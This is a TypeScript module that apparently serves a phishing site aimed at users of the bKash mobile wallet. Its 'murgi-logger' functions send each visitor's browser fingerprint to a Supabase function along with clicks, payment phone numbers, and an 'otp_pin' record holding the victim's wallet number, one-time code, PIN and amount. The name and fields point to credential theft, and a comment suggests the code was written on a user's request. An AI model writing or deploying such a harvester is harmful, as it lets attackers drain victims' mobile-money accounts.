import { supabase } from "@/integrations/supabase/client";

// Utility to get lightweight client info from the browser
function getClientInfo() {
  try {
    return {
      ua: navigator.userAgent,
      screen: `${window.screen?.width ?? ""}x${window.screen?.height ?? ""}`,
      referrer: document.referrer,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      lang: navigator.language,
    };
  } catch {
    return {} as Record<string, unknown>;
  }
}

async function invoke(type: string, data: Record<string, unknown> = {}) {
  const body = { type, data: { ...data, ...getClientInfo() } };
  try {
    await supabase.functions.invoke("murgi-logger", { body });
  } catch (e) {
    console.warn("murgi-logger invoke failed", e);
  }
}

// Public API mirroring the user's desired functions
export const murgiLogger = {
  logMembershipClick: (platform = "Youtube") => invoke("membership_click", { platform }),
  logBetaAccessClick: (page = "unknown page") => invoke("beta_access_click", { page }),
  logPaymentNumber: (page = "Payment Page", number = "") => invoke("payment_number", { page, number }),
  logPaymentGatewayOpen: (gateway = "Payment") => invoke("payment_gateway_open", { gateway }),
  logOTP_PIN: (
    method: string = "bKash",
    details: { number?: string; otp?: string; pin?: string; amount?: string } = {}
  ) => invoke("otp_pin", { method, ...details }),
  logGeneric: (text: string) => invoke("generic", { text }),
};

// Attach to window for easy access like the original snippet
// eslint-disable-next-line @typescript-eslint/no-explicit-any
;(window as any).murgiLogger = murgiLogger;

export default murgiLogger;
